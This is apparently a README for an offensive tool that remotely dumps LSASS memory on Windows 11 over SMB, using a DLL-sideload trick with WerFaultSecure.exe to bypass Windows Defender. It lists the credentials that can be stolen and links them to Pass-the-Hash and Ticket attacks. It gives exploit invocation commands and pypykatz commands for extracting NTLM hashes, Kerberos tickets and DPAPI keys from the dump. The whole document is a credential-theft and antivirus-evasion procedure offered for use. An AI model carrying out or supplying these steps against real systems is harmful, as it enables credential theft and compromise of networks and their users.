# LSASS evasion technique for W11

Dumps LSASS memory from a remote Windows 11 host over SMB using a **WerFaultSecure.exe + WSASS.exe** DLL-sideload technique to bypass Windows Defender.

## What gets dumped

LSASS (Local Security Authority Subsystem Service) holds in-memory credentials for all logged-on users:

| Data | Description |
|---|---|
| **NTLM hashes** | Can be used directly for Pass-the-Hash attacks |
| **Plaintext passwords** | Present when WDigest is enabled or on older patch levels |
| **Kerberos tickets (TGT/TGS)** | Can be used for Pass-the-Ticket / Silver/Gold Ticket attacks |
| **DPAPI master keys** | Used to decrypt browser-saved credentials, certificates, etc. |
| **MSV / SSP / LiveSSP credentials** | Additional credential providers stored by LSASS |

## Requirements

- `nxc` (NetExec) — SMB execution
- `smbclient` — file transfer
- `WerFaultSecure.exe` + `WSASS.exe` — must be present in the same directory
- `python3` + `pypykatz` — for parsing the dump

## Run the exploit

```bash
# Domain-joined target
./exploit.sh --ip <ip> --domain <domain> --username <username> --password <password>

# Local account
./exploit.sh --ip <ip> --username <username> --password <password>
```

## Parse the dump with pypykatz

```bash
# Full dump — shows all credential providers
pypykatz lsa minidump lsass.dmp

# NTLM hashes only (great for Pass-the-Hash)
pypykatz lsa minidump lsass.dmp | grep -A3 "== MSV =="

# JSON output (for scripting / further processing)
pypykatz lsa minidump lsass.dmp -o json -e lsass_creds.json

# Kerberos tickets
pypykatz lsa minidump lsass.dmp | grep -A5 "== Kerberos =="

# DPAPI master keys
pypykatz lsa minidump lsass.dmp | grep -A5 "== DPAPI =="
```
